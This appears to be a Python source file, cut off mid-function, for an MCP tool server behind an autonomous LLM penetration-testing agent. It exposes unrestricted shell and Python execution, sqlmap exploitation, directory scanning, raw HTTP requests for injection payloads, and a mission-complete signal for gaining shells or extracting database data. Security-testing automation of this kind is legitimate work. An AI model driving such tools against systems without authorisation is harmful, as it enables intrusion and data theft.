# -*- coding: utf-8 -*-
"""
MCP服务主框架 - 基于FastMCP实现的安全工具集成层.

本模块提供了统一的MCP (Model Control Protocol) 服务接口,
封装了各类安全测试工具,供上层Agent调用。

主要功能:
    - HTTP/HTTPS请求工具
    - Shell命令执行工具
    - 元认知工具(思考、假设、反思、专家分析)
    - 任务终止控制

设计原则:
    - 通用性: 支持多种渗透测试场景
    - 可扩展: 便于添加新工具
    - 错误处理: 完善的异常捕获和错误报告
"""

import asyncio
import json
import subprocess
import time
import logging
from typing import Dict, Any, List
from http.server import BaseHTTPRequestHandler
import sys
import os
import threading
from collections import deque
import httpx
import requests

# Add project root to sys.path to allow imports from conf
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

try:
    from conf.config import SCENARIO_MODE, KNOWLEDGE_SERVICE_URL
except ImportError:
    # Fallback defaults if config cannot be loaded
    SCENARIO_MODE = "general"
    KNOWLEDGE_SERVICE_URL = "http://127.0.0.1:8081"

# 导入 MCP 相关库，增加错误处理
try:
    import mcp.server
    # 尝试导入 FastMCP，如果 mcp.server 中没有，可能在 fastmcp 包中
    try:
        from mcp.server.fastmcp import FastMCP
    except ImportError:
        try:
            from fastmcp import FastMCP
        except ImportError:
            FastMCP = None
            
    from mcp.server.lowlevel import Server
except ImportError as e:
    # 如果导入失败，创建一个伪造的 mcp_server_module 以避免立即崩溃，
    # 但在运行时会报错。
    logging.error(f"Critical Import Error: Failed to import 'mcp'. Please run 'pip install mcp'. Details: {e}")
    mcp_server_module = None
    FastMCP = None
    Server = None

# 设置环境变量，抑制不必要的输出和警告
os.environ.setdefault("FASTMCP_NO_BANNER", "1")
os.environ.setdefault("FASTMCP_LOG_LEVEL", "WARNING")
os.environ.setdefault("CUDA_VISIBLE_DEVICES", "")  # 禁用 CUDA
import warnings

warnings.filterwarnings("ignore", category=UserWarning, module="torch.cuda")
warnings.filterwarnings("ignore", category=FutureWarning)

# 配置日志
# Ensure logs directory exists
log_dir = os.path.join(os.path.dirname(__file__), "../logs")
os.makedirs(log_dir, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler(), logging.FileHandler(os.path.join(log_dir, "mcp_service.log"))],
)
logger = logging.getLogger(__name__)

# 配置特定库的日志级别以减少冗余输出
logging.getLogger('mcp.server.lowlevel.server').setLevel(logging.WARNING)
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('httpx.AsyncClient').setLevel(logging.WARNING) # 针对 httpx AsyncClient 的更具体配置


# 兼容 fastmcp.FastMCP 或 mcp.server.Server
MCPServerClass = None

if FastMCP:
    MCPServerClass = FastMCP
elif Server:
    MCPServerClass = Server
else:
    # Fallback or error if neither is found
    if mcp_server_module and hasattr(mcp_server_module, "FastMCP"):
        MCPServerClass = getattr(mcp_server_module, "FastMCP")
    elif mcp_server_module and hasattr(mcp_server_module, "Server"):
        MCPServerClass = getattr(mcp_server_module, "Server")

if MCPServerClass is None:
    raise ImportError("无法找到可用的 MCP Server 类 (FastMCP 或 Server)。请确保安装了 'mcp' 或 'fastmcp'。")

# 初始化 MCP 服务实例
mcp = MCPServerClass("LuaN1ao-mcp")

# Shared session context for all tools in this service
_httpx_client = httpx.AsyncClient(verify=False)  # 忽略SSL证书验证


_THINK_HISTORY_LIMIT = 50
_think_history: deque[Dict[str, Any]] = deque(maxlen=_THINK_HISTORY_LIMIT)


@mcp.tool()
def think(
    analysis: str,
    problem: str,
    reasoning_steps: List[str],
    conclusion: str,
) -> str:
    """
    结构化思考与推理工具 (元认知工具)。用于深度分析问题，或在陷入僵局时明确识别知识缺口。

    :param analysis: 对当前情况或上下文的简要分析。
    :param problem: 你正在试图解决的具体问题或需要做出的决策。
    :param reasoning_steps: 一个字符串列表，详细列出你的推理过程。
    :param conclusion: 基于以上推理得出的最终结论或下一步行动的摘要。
    """
    timestamp = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    entry = {
        "type": "structured_thought",
        "timestamp": timestamp,
        "analysis": analysis,
        "problem": problem,
        "reasoning_steps": reasoning_steps,
        "conclusion": conclusion,
    }

    # 思考历史记录现在可以存储更结构化的数据
    _think_history.append(entry)

    payload = {
        "result": "ok",
        "message": "结构化思考过程已记录。",
        "recorded_thought": entry,
    }

    return json.dumps(payload, ensure_ascii=False, indent=2)


# 延迟初始化全局组件，避免启动时加载
_llm_client = None


def get_llm_client():
    """获取全局 LLM 客户端实例（延迟加载）"""
    global _llm_client
    if _llm_client is None:
        try:
            from llm.llm_client import LLMClient
        except ImportError as e:
            # 如果相对导入失败,尝试绝对导入
            import sys
            from pathlib import Path
            project_root = Path(__file__).parent.parent
            if str(project_root) not in sys.path:
                sys.path.insert(0, str(project_root))
            try:
                from llm.llm_client import LLMClient
            except ImportError as import_error:
                # Fallback: load by file path to avoid module resolution issues
                try:
                    import importlib.util

                    llm_path = project_root / "llm" / "llm_client.py"
                    if not llm_path.exists():
                        raise ImportError(f"llm_client.py not found at {llm_path}")

                    spec = importlib.util.spec_from_file_location("llm.llm_client", llm_path)
                    if spec is None or spec.loader is None:
                        raise ImportError(f"Unable to create module spec for {llm_path}")
                    module = importlib.util.module_from_spec(spec)
                    sys.modules["llm.llm_client"] = module
                    spec.loader.exec_module(module)
                    LLMClient = module.LLMClient
                except Exception as fallback_error:
                    raise ImportError(
                        f"无法导入 LLMClient: {import_error}. "
                        f"请检查项目结构、依赖和 PYTHONPATH 配置。"
                        f"当前 sys.path: {sys.path}. "
                        f"Fallback error: {fallback_error}"
                    )
        
        _llm_client = LLMClient()
    return _llm_client


# 全局任务ID，由agent在启动时设置
# CURRENT_TASK_ID = None (已移除，改用参数传递)


@mcp.tool()
def complete_mission(reason: str, evidence: str, task_id: str) -> str:
    """
    任务完成信号工具(高优先级).

    当且仅当你100%确定顶层任务目标已完全达成时调用此工具。
    此工具将立即成功地终止整个任务和所有其他并行的子任务。

    使用场景示例:
        - 获取了目标系统的shell访问权限
        - 提取到了目标数据库的敏感信息
        - 找到了目标凭证或证据
        - 成功验证了关键漏洞的存在性

    Args:
        reason: 任务完成的详细理由说明
        evidence: 关键证据（如shell命令输出、数据库内容、API响应等）
        task_id: 当前任务的唯一ID

    Returns:
        str: 确认任务完成信号已发出的JSON字符串

    Raises:
        无: 所有异常均被捕获并以JSON格式返回错误信息
    """
    try:
        ev = evidence.strip() if isinstance(evidence, str) else ""

        # 创建终止信号文件
        halt_file_path = f"/tmp/{task_id}.halt"
        with open(halt_file_path, "w", encoding="utf-8") as f:
            json.dump({"reason": reason, "evidence": ev}, f, ensure_ascii=False, indent=2)

        return json.dumps(
            {"success": True, "message": "任务完成信号已发送。终止文件中已记录理由和证据。"}, ensure_ascii=False
        )

    except (OSError, IOError) as e:
        logger.error(f"文件写入错误: {e}")
        return json.dumps({"success": False, "error": f"无法写入终止文件: {e}"}, ensure_ascii=False)
    except Exception as e:
        logger.exception("发送终止信号时发生未预期的错误")
        return json.dumps({"success": False, "error": f"发送终止信号失败: {e}"}, ensure_ascii=False)


@mcp.tool()
def formulate_hypotheses(hypotheses: List[Dict[str, Any]]) -> str:
    """
    提出假设工具 (元认知工具)。用于在陷入僵局时，系统性地提出新的攻击可能性。
    使用时机和范例请参考主提示词中的“指导原则”部分。

    :param hypotheses: 一个假设对象的列表。每个对象**必须**是一个包含 'description'(str) 和 'confidence'(float, 0.0-1.0) 键的字典。
    :return: 一个确认假设已记录的JSON字符串。
    """
    timestamp = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

    # Log the hypotheses for traceability
    hypotheses_record = {"type": "hypothesis_formulation", "timestamp": timestamp, "hypotheses": hypotheses}

    # The real value is forcing the LLM to perform this structured thinking step.
    return json.dumps(
        {
            "success": True,
            "status": "Hypotheses recorded. Now, select your highest-confidence hypothesis and design an action to test it.",
            "hypotheses_record": hypotheses_record,
        },
        ensure_ascii=False,
        indent=2,
    )


@mcp.tool()
def reflect_on_failure(failed_action: Dict[str, Any], error_message: str) -> str:
    """
    失败反思工具 (元认知工具)。用于在动作失败后进行结构化的根因分析。
    使用时机和范例请参考主提示词中的“指导原则”部分。

    :param failed_action: 执行失败的整个action对象，包含'tool'和'params'。
    :param error_message: 工具返回的明确错误信息。
    :return: 一个确认反思已记录的JSON字符串。
    """

    # 这个工具的核心价值在于引导LLM进行结构化思考，而不是执行复杂的后端逻辑。
    # 它强制LLM将失败作为一个明确的事件来处理。

    timestamp = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

    reflection_record = {
        "type": "failure_reflection",
        "timestamp": timestamp,
        "failed_action": failed_action,
        "error_message": error_message,
    }

    # 可以在这里将记录保存到日志或专门的失败分析文件中
    logger.info(f"失败反思已记录: {reflection_record}")

    return json.dumps(
        {
            "success": True,
            "status": "Reflection recorded. Now, you must analyze the failure in your 'thought' process and propose a corrected action.",
            "reflection_record": reflection_record,
        },
        ensure_ascii=False,
        indent=2,
    )


@mcp.tool()
async def expert_analysis(question: str, context_data: str = "") -> str:
    """
    专家分析工具 (元认知工具)。用于请求独立的、深度的问题分析。
    使用时机和范例请参考主提示词中的“指导原则”部分。
    触发条件：当知识库（RAG）已进行至少两轮不同关键词/源类型检索仍无法获得有效知识，或问题涉及未知格式/算法、复杂正则过滤、黑盒协议逆向等高难度领域。
    调用建议：在 `context_data` 中附上失败的检索词、源类型、关键证据（错误信息、源码片段、日志、请求/响应样本）与当前假设状态，以便专家快速定位。

    :param question: 你需要专家回答的具体问题。这个问题应该尽可能清晰、具体。可以使用伪代码来描述你希望专家分析的算法或逻辑。
    :param context_data: (可选) 解决问题所需的所有相关数据，例如代码片段、token字符串、错误信息等。
    :return: 一个包含专家级分析和建议的详细报告。
    """
    try:
        # 专门为专家分析设计的、独立的系统提示词
        expert_system_prompt = (
            "你是一位世界级的网络安全研究员、逆向工程师和Python专家。"
            "你精通分析复杂数据结构、加密算法和序列化格式（如pickle）。"
            "一位初级智能体向你升级了一个难题。你的任务是提供详细、循序渐进且具有教学意义的分析。"
            "你的回答必须清晰、精确且可直接操作。首先简要陈述你对问题的宏观理解，"
            "然后提供解决该问题的详细分步计划。最后总结关键要点。"
        )

        # 构造发送给“专家”模型的消息
        expert_messages = [
            {"role": "system", "content": expert_system_prompt},
            {
                "role": "user",
                "content": f"Here is the problem and the relevant data:\n\n**Problem/Question:**\n{question}\n\n**Contextual Data:**\n```\n{context_data}\n```",
            },
        ]

        # 使用全局的 llm_client 实例进行调用
        llm = get_llm_client()
        # 对专家分析不强制JSON模式，避免某些提供商在JSON模式下返回错误
        content, call_metrics = await llm.send_message(expert_messages, role="expert_analysis", expect_json=False)

        model_used = llm.models.get("expert_analysis") or llm.models.get("default")

        return json.dumps(
            {
                "success": True,
                "provider": llm.provider,
                "model": model_used,
                "report": content,
                "metrics": call_metrics or {},
            },
            ensure_ascii=False,
            indent=2,
        )

    except ImportError as e:
        logger.error(f"LLM客户端导入失败: {e}")
        return json.dumps(
            {
                "success": False,
                "error_type": "CONFIGURATION",
                "error": f"LLM客户端配置错误: {str(e)}",
                "fix_suggestion": "请检查LLM客户端配置和依赖",
            },
            ensure_ascii=False,
            indent=2,
        )
    except ConnectionError as e:
        logger.error(f"LLM服务连接失败: {e}")
        return json.dumps(
            {
                "success": False,
                "error_type": "CONNECTION",
                "error": f"无法连接到LLM服务: {str(e)}",
                "fix_suggestion": "请检查网络连接和LLM服务状态",
            },
            ensure_ascii=False,
            indent=2,
        )
    except Exception as e:
        logger.exception("专家分析工具执行失败")
        return json.dumps(
            {
                "success": False,
                "error_type": "RUNTIME",
                "error": f"专家分析失败: {str(e)}",
                "fix_suggestion": "请检查输入参数和系统配置",
            },
            ensure_ascii=False,
            indent=2,
        )


@mcp.tool()
async def retrieve_knowledge(
    query: str, top_k: int = 5, service_url: str = None
) -> str:
    """
    从集中式知识库服务中进行语义检索。

    扫描 knowledge_base 目录下的所有文档。
    包括：
    - 攻击技术和绕过方法
    - 漏洞利用手册
    等

    **使用场景**：
    - 需要查找特定攻击技术时（如"SQL注入绕过WAF"）
    - 遇到陌生漏洞需要参考案例时
    - 需要了解某个工具的使用方法时
    - 寻找类似问题的解决方案时

    **最佳实践**：
    - 使用具体的技术术语作为查询词（如"LFI path traversal"而非"文件漏洞"）

    Args:
        query: 查询问题或关键字，例如 "如何绕过SQL注入的WAF过滤" 或 "SSRF漏洞利用方法"
        top_k: 希望检索出的最相关知识条目数量（1-10，推荐5）
        service_url: 知识服务URL（可选，默认从环境变量 KNOWLEDGE_SERVICE_URL 读取，或回退到 localhost）

    Returns:
        包含检索结果的JSON字符串，格式：
        {
            "success": bool,
            "query": str,
            "total_results": int,
            "results": [
                {
                    "id": str,
                    "snippet": str,  # 相关内容片段
                    "score": float,  # 相似度分数（0-1，越高越相关）
                },
                ...
            ]
        }

    示例：
        # 查找SQL注入相关技术
        result = await retrieve_knowledge("SQL injection WAF bypass", top_k=3)
    """
    # 动态确定服务 URL
    if not service_url:
        service_url = KNOWLEDGE_SERVICE_URL

    try:
        response = await _httpx_client.post(
            f"{service_url}/retrieve_knowledge", json={"query": query, "top_k": top_k}, timeout=30
        )
        response.raise_for_status()
        return json.dumps(response.json(), ensure_ascii=False, indent=2)
    except httpx.RequestError as e:
        return json.dumps(
            {
                "success": False,
                "error": f"无法连接到知识库服务 ({service_url}): {e}",
                "suggestion": "请确保知识服务已启动（agent.py 会自动启动）",
            },
            ensure_ascii=False,
            indent=2,
        )
    except Exception as e:
        return json.dumps({"success": False, "error": f"检索知识时发生错误: {e}"}, ensure_ascii=False, indent=2)


@mcp.tool()
async def shell_exec(command: str) -> str:
    """
    Shell命令执行接口 (异步非阻塞)。实时将输出打印到终端。
    禁止执行mcp服务中已提供的工具，如dirsearch等
    :param command: 要执行的shell命令（如"ls -al"）
    :return: 命令输出结果
    """
    output_lines = []
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT
        )

        # Real-time output handling
        while True:
            line = await process.stdout.readline()
            if not line:
                break
            # Decode bytes to string
            decoded_line = line.decode('utf-8', errors='replace')
            output_lines.append(decoded_line)

        return_code = await process.wait()

        full_output = "".join(output_lines)

        if return_code != 0:
            error_message = f"Command '{command}' returned non-zero exit status {return_code}."
            error_type = "RUNTIME"
            fix_suggestion = "Check the command's arguments and permissions."
            if "not found" in full_output or "No such file or directory" in full_output:
                error_type = "MISSING_TOOL"
                fix_suggestion = "The command or tool does not exist. Choose an alternative from the available tools."
            elif "Only 1 -p option allowed" in full_output:
                error_type = "SYNTAX"
                fix_suggestion = "Incorrect command syntax. Review the tool's help or manual for correct usage."

            return json.dumps(
                {
                    "success": False,
                    "output": full_output,
                    "error_type": error_type,
                    "message": error_message,
                    "fix_suggestion": fix_suggestion,
                }
            )

        return json.dumps({"success": True, "output": full_output, "error": ""})

    except Exception as e:
        # 增强错误输出，确保agent感知具体失败原因
        logger.exception(f"shell_exec执行失败: {e}")
        detailed_error = f"{type(e).__name__}: {str(e)}"
        if not output_lines:
            detailed_error += "; No output captured before exception."
        return json.dumps(
            {
                "success": False,
                "output": "".join(output_lines) if output_lines else "",
                "error_type": "RUNTIME",
                "message": detailed_error,
                "fix_suggestion": "An unexpected error occurred during command execution. Check arguments, permissions, and environment.",
            }
        )


# Concurrency lock for python_exec (sys.stdout patching is not thread-safe)
_python_exec_lock = asyncio.Lock()

@mcp.tool()
async def python_exec(script: str) -> str:
    """
    Python脚本执行接口 (异步非阻塞).
    此工具现在运行在独立线程中，不会阻塞主服务，允许你在运行长时间计算时保持系统响应。
    **警告：请勿使用此工具直接发送HTTP请求！** 对于所有网络请求，请务必使用 `http_request` 工具。
    **⚠️请注意需要显式设置之前工具、会话获取的cookie、session**
    :param script: 要执行的Python代码字符串。确保代码是自包含的，并通过 `print()` 输出结果。
    :return: 执行输出结果
    """
    import io

    # 定义同步执行函数
    def _run_script():
        old_stdout = sys.stdout
        old_stderr = sys.stderr
        sys.stdout = io.StringIO()
        sys.stderr = io.StringIO()
        try:
            # 1. Extract cookies from the shared httpx client
            session_cookies = _httpx_client.cookies

            # 2. Prepare the sandbox environment
            sandbox_session = requests.Session()
            try:
                # Build a de-duplicated cookie jar to avoid "Multiple cookies exist" errors
                jar = requests.cookies.RequestsCookieJar()
                cookie_iter = getattr(session_cookies, "jar", session_cookies)
                for cookie in cookie_iter:
                    jar.set(
                        cookie.name,
                        cookie.value,
                        domain=getattr(cookie, "domain", None),
                        path=getattr(cookie, "path", None),
                    )
                sandbox_session.cookies = jar
            except Exception as cookie_error:
                # If inheritance fails, continue with empty session without polluting tool output
                logger.warning(f"python_exec cookie inheritance skipped: {cookie_error}")

            global_scope = {
                "requests": requests,
                "session": sandbox_session,
                "json": json,
            }

            compile(script, "<string>", "exec")
            exec(script, global_scope)
            output = sys.stdout.getvalue()
            error = sys.stderr.getvalue()
            
            # Capture cookies to return
            captured_cookies = sandbox_session.cookies
            
            return {
                "success": True, 
                "output": output, 
                "error": error,
                "cookies": captured_cookies
            }
        except SyntaxError as e:
            return {
                "success": False, 
                "error_type": "SYNTAX", 
                "message": f"Python Syntax Error: {e}",
                "fix_suggestion": "Review the Python code for syntax errors."
            }
        except ImportError as e:
             return {
                "success": False,
                "output": sys.stdout.getvalue(),
                "error_type": "IMPORT",
                "message": f"Import Error: {e}",
                "fix_suggestion": "Check modules."
            }
        except Exception as e:
            output = sys.stdout.getvalue()
            error = sys.stderr.getvalue()
            return {
                "success": False,
                "output": output,
                "error": error,
                "error_type": "RUNTIME",
                "message": f"{type(e).__name__}: {str(e)}",
                "fix_suggestion": "Unexpected error."
            }
        finally:
            sys.stdout = old_stdout
            sys.stderr = old_stderr

    # 在线程池中执行
    loop = asyncio.get_running_loop()
    try:
        # Serialize execution to prevent sys.stdout conflict
        async with _python_exec_lock:
            result = await loop.run_in_executor(None, _run_script)
        
        # [Sync Back Logic]
        # 如果脚本中修改了 session.cookies，尝试将其同步回全局 httpx client
        # 注意：这里我们假设 python_exec 是同步执行的，因此此时 sandbox_session 可能已经发生变化
        # 但这就需要 _run_script 返回 session 对象或者 extract cookie
        # 修改 _run_script 返回值包含 cookies 是最好的方法
        
        # Wait, _run_script returns a dict with 'output' etc.
        # We need to capture the cookies INSIDE _run_script and return them.
        
        # Let's verify if the edit below handles this correctly.
        # Check carefully.
        
        # Actually, since _run_script is a closure, and _httpx_client is global...
        # But _httpx_client is NOT thread-safe for mutation concurrent with reads?
        # It's better to return cookies in the result dict and update in the main thread (async loop).
        
        if result.get("success") and "cookies" in result:
             # Sync back cookies from script execution to global client
             new_cookies = result.pop("cookies") # remove from output
             _httpx_client.cookies.update(new_cookies)
             
        return json.dumps(result, ensure_ascii=False)
    except Exception as e:
         logger.exception("python_exec thread execution failed")
         return json.dumps({"success": False, "error": f"Thread Error: {str(e)}"}, ensure_ascii=False)



@mcp.tool()
async def sqlmap_tool(
    url: str = None,
    raw_request_file: str = None,
    tamper: str = None,
    level: int = 1,
    risk: int = 1,
    dbms: str = None,
    extra_args: str = None
) -> str:
    """
    Execute sqlmap to detect and exploit SQL injection vulnerabilities.
    
    Args:
        url: Target URL (e.g., "http://www.site.com/vuln.php?id=1")
        raw_request_file: Path to a file containing a raw HTTP request (alternative to url)
        tamper: Tamper script names, comma-separated (e.g., "space2comment,randomcase")
        level: Level of tests to perform (1-5, default 1)
        risk: Risk of tests to perform (1-3, default 1)
        dbms: Force back-end DBMS to provided value (e.g., "mysql", "postgresql")
        extra_args: Additional command line arguments (e.g., "--batch --random-agent")

    Returns:
        JSON string containing the execution result (stdout/stderr).
    """
    cmd = ["sqlmap"]
    
    if url:
        cmd.extend(["-u", url])
    elif raw_request_file:
        cmd.extend(["-r", raw_request_file])
    else:
        return json.dumps({"success": False, "error": "Either 'url' or 'raw_request_file' must be provided."}, ensure_ascii=False)
        
    # Basic non-interactive settings
    cmd.extend(["--batch", "--random-agent"])
    
    if tamper:
        cmd.extend(["--tamper", tamper])
    
    if level and 1 <= level <= 5:
        cmd.extend(["--level", str(level)])
    
    if risk and 1 <= risk <= 3:
        cmd.extend(["--risk", str(risk)])
        
    if dbms:
        cmd.extend(["--dbms", dbms])
        
    if extra_args:
        # Simple splitting, be careful with quotes in extra_args if manually passed
        # Ideally, we should use shlex.split but we'll keep it simple for now or assume lists
        import shlex
        cmd.extend(shlex.split(extra_args))

    # Add output directory to capture results if needed, but for now we rely on stdout
    # Or we could force it to dump to a specific directory we can read back.
    # For MCP simple usage, stdout is primary.

    try:
        # Run sqlmap
        logger.info(f"Executing sqlmap command: {' '.join(cmd)}")
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        stdout, stderr = await process.communicate()
        
        return json.dumps({
            "success": True if process.returncode == 0 else False,
            "command": " ".join(cmd),
            "stdout": stdout.decode(errors='replace'),
            "stderr": stderr.decode(errors='replace'),
            "returncode": process.returncode
        }, ensure_ascii=False)
        
    except FileNotFoundError:
        return json.dumps({
            "success": False,
            "error": "sqlmap command not found. Please ensure sqlmap is installed and in the system PATH.",
            "error_type": "TOOL_MISSING"
        }, ensure_ascii=False)
    except Exception as e:
        logger.exception("sqlmap execution failed")
        return json.dumps({"success": False, "error": str(e)}, ensure_ascii=False)


@mcp.tool()
async def parse_html_form(url: str = None, html_content: str = None) -> str:
    """
    Robust HTML Form Parser tool.
    Extracts all forms, inputs, selects, textareas, and CRITICALLY, submit buttons.
    Addressing XBEN-071 failure where 'submit' parameter was missed.
    
    Args:
        url: URL to fetch HTML from (uses shared session).
        html_content: Raw HTML content (optional, overrides url).
        
    Returns:
        JSON string describing findings forms and their parameters.
    """
    from bs4 import BeautifulSoup
    from urllib.parse import urljoin

    target_html = html_content
    base_url = url or ""

    if not target_html and url:
        try:
            resp = await _httpx_client.get(url, follow_redirects=True, timeout=10)
            target_html = resp.text
            base_url = str(resp.url)
        except Exception as e:
            return json.dumps({"success": False, "error": f"Failed to fetch URL: {str(e)}"})

    if not target_html:
        return json.dumps({"success": False, "error": "No HTML content provided"})

    try:
        soup = BeautifulSoup(target_html, 'html.parser')
        forms_data = []

        for i, form in enumerate(soup.find_all('form')):
            action = form.get('action')
            if action:
                action_url = urljoin(base_url, action)
            else:
                action_url = base_url
                
            method = form.get('method', 'GET').upper()
            
            inputs = []
            # Standard inputs
            for inp in form.find_all('input'):
                name = inp.get('name')
                if not name: continue
                inputs.append({
                    "name": name,
                    "type": inp.get('type', 'text'),
                    "value": inp.get('value', ''),
                    "required": inp.get('required') is not None
                })
            
            # Selects
            for sel in form.find_all('select'):
                name = sel.get('name')
                if not name: continue
                options = [opt.get('value', opt.text) for opt in sel.find_all('option')]
                inputs.append({
                    "name": name, 
                    "type": "select",
                    "options": options,
                    "value": options[0] if options else ""
                })
            
            # Textareas
            for ta in form.find_all('textarea'):
                name = ta.get('name')
                if not name: continue
                inputs.append({
                    "name": name,
                    "type": "textarea",
                    "value": ta.text or ""
                })

            # Buttons (CRITICAL for XBEN-071)
            # Find both <button> and <input type="submit">
            submit_buttons = []
            for btn in form.find_all(['button', 'input']):
                if btn.name == 'input' and btn.get('type') != 'submit':
                    continue
                if btn.name == 'button' and btn.get('type') not in [None, 'submit']:
                    continue
                    
                btn_name = btn.get('name')
                btn_value = btn.get('value', '')
                
                # If a button has a name, it IS a parameter when clicked
                if btn_name:
                    submit_buttons.append({
                        "name": btn_name,
                        "value": btn_value,
                        "type": "submit"
                    })
                # Even if no name, it might be relevant for logic, but usually only named buttons send data
            
            # Combine
            all_params = inputs + submit_buttons
            
            forms_data.append({
                "form_index": i,
                "action": action_url,
                "method": method,
                "params": all_params,
                "param_names": [p['name'] for p in all_params]
            })

        return json.dumps({
            "success": True, 
            "forms_found": len(forms_data),
            "forms": forms_data
        }, ensure_ascii=False, indent=2)

    except Exception as e:
        return json.dumps({"success": False, "error": f"Parsing failed: {str(e)}"})


@mcp.tool()
async def dirsearch_scan(url: str, extensions: str = "php,html,js,txt", extra_args: str = "") -> str:
    """
    Dirsearch Web目录扫描 (异步非阻塞)。实时将输出打印到终端。
    :param url: 目标URL
    :param extensions: 扫描文件扩展名（如"php,html,js,txt"）
    :param extra_args: 其他Dirsearch参数
    :return: 扫描结果
    """
    # 过滤已知不兼容的参数（不同版本的 dirsearch 参数不同）
    INCOMPATIBLE_ARGS = {
        "--recursive-level": "-r",  # 旧版本使用 --recursive-level N，新版本使用 -r 或 --max-recursion-depth
        "--recursion-level": "-r",
    }
    
    # 处理 extra_args，移除不兼容参数并记录警告
    filtered_args = []
    if extra_args:
        args_list = extra_args.split()
        i = 0
        while i < len(args_list):
            arg = args_list[i]
            # 检查是否是不兼容参数
            incompatible = False
            for bad_arg, replacement in INCOMPATIBLE_ARGS.items():
                if arg.startswith(bad_arg):
                    logger.warning(f"[dirsearch_scan] 过滤不兼容参数 '{arg}'，使用 '{replacement}' 替代")
                    # 如果参数带值（如 --recursive-level 2），跳过值
                    if "=" not in arg and i + 1 < len(args_list) and not args_list[i + 1].startswith("-"):
                        i += 1  # 跳过参数值
                    filtered_args.append(replacement)
                    incompatible = True
                    break
            if not incompatible:
                filtered_args.append(arg)
            i += 1
    
    cmd = f"dirsearch -u {url} -e {extensions} -q"
    if filtered_args:
        cmd += " " + " ".join(filtered_args)

    output_lines = []
    try:
        process = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE, 
            stderr=asyncio.subprocess.STDOUT
        )

        while True:
            line = await process.stdout.readline()
            if not line:
                break
            decoded_line = line.decode('utf-8', errors='replace')
            output_lines.append(decoded_line)

        return_code = await process.wait()
        full_output = "".join(output_lines)

        # 检测参数错误并提供更友好的错误信息
        if return_code != 0:
            error_type = "RUNTIME"
            fix_suggestion = "Check the command's arguments and permissions."
            
            if "no such option" in full_output.lower() or "unrecognized arguments" in full_output.lower():
                error_type = "INVALID_ARGS"
                fix_suggestion = "Some arguments are not supported by the installed dirsearch version. Try without extra_args."
            elif "not found" in full_output.lower():
                error_type = "MISSING_TOOL"
                fix_suggestion = "Install dirsearch or use alternative directory scanning methods."
            
            return json.dumps(
                {
                    "success": False,
                    "output": full_output,
                    "error_type": error_type,
                    "message": f"Command returned non-zero exit status {return_code}.",
                    "fix_suggestion": fix_suggestion,
                }
            )

        return json.dumps({"success": True, "output": full_output, "error": ""})

    except Exception as e:
        logger.exception("dirsearch_scan执行失败")
        return json.dumps(
            {
                "success": False,
                "output": "".join(output_lines) if output_lines else "",
                "error_type": "RUNTIME",
                "message": f"Dirsearch execution failed: {str(e)}",
                "fix_suggestion": "Check tool availability, arguments, and target accessibility.",
            }
        )


def _coerce_bool(value, default=False):
    """将多种输入格式转换为布尔值。"""

    if value is None:
        return default

    if isinstance(value, bool):
        return value

    if isinstance(value, (int, float)):
        return bool(value)

    if isinstance(value, str):
        lowered = value.strip().lower()
        if lowered in {"true", "1", "yes", "y", "on"}:
            return True
        if lowered in {"false", "0", "no", "n", "off"}:
            return False

    return default

@mcp.tool()
async def http_request(
    url: str,
    method: str = "GET",
    headers: dict = None,
    data: str | dict = None,
    timeout: int = 10,
    allow_redirects: bool | str | int | None = True,
    raw_mode: bool = False,
) -> str:
    """
    (首选)专业且健壮的HTTP请求工具，用于网络探测和安全测试。
    这是执行所有类型HTTP请求（GET, POST, PUT等）的首选方法，因为它提供了详细的请求/响应信息和自动化的会话管理。
    **重要：此工具使用一个持久化的会话，自动管理Cookie。**
    基础HTTP请求工具，**用于单次、探索性的请求**。**对于任何重复性、系统性的测试（如Fuzzing、盲注、爆破），你必须使用`python_exec`工具。**

    Args:
        url: 目标URL
        method: HTTP方法 (GET, POST, PUT, DELETE等)
        headers: HTTP头，以键值对形式提供。**重要：如果需要发送特定的HTTP头部（例如 `X-Requested-With`, `Cookie`, `Authorization`），必须在此参数中明确提供。**
        data: 请求体。可以是URL编码的字符串，也可以是表单数据的字典。
              **Content-Type 处理说明**：
              - 如果 `headers` 中已包含 `Content-Type`，则优先使用。
              - 如果 `data` 是字典且 `Content-Type` 未指定，将自动设置为 `application/x-www-form-urlencoded`。
              - 如果 `data` 是字符串且 `Content-Type` 未指定，将自动设置为 `application/x-www-form-urlencoded`。
              - 如果 `data` 是字典且 `Content-Type` 为 `application/json`，则 `data` 将被序列化为 JSON 字符串。
        timeout: 请求超时时间（秒）
        allow_redirects: 是否自动跟踪重定向。接受布尔值或对应的字符串（如"true", "false"）。默认为True。

    Returns:
        一个包含HTTP响应详细信息的JSON字符串。

    重要参数说明：
    - raw_mode: 当为 True 且 method 为 POST/PUT/PATCH 时，禁用自动表单编码，直接按原样发送请求体。
      用于安全测试场景（如 XSS 需要原始尖括号）避免因 URL/Form 编码导致 payload 失效。
    """
    try:
        start_time = time.time()

        # 准备请求参数
        follow_redirects = _coerce_bool(allow_redirects, default=True)

        request_params = {
            "url": url,
            "method": method.upper(),
            "timeout": timeout,
            "follow_redirects": follow_redirects,
        }

        # 准备headers
        request_headers = headers.copy() if headers else {}

        # 添加请求体数据
        prepared_body_preview = None
        encoding_mode = "none"
        if data and method.upper() in ["POST", "PUT", "PATCH"]:
            user_content_type = next((v for k, v in request_headers.items() if k.lower() == "content-type"), "").lower()

            if raw_mode:
                # 原始模式：不做任何URL/Form编码，按原文发送
                if isinstance(data, dict):
                    # 直接拼接为 key=value&key2=value2，不做 urlencode
                    try:
                        prepared_body = "&".join([f"{str(k)}={str(v)}" for k, v in data.items()])
                    except Exception:
                        prepared_body = str(data)
                else:
                    prepared_body = str(data)

                request_params["content"] = prepared_body.encode("utf-8")
                prepared_body_preview = prepared_body[:500]
                encoding_mode = "raw"
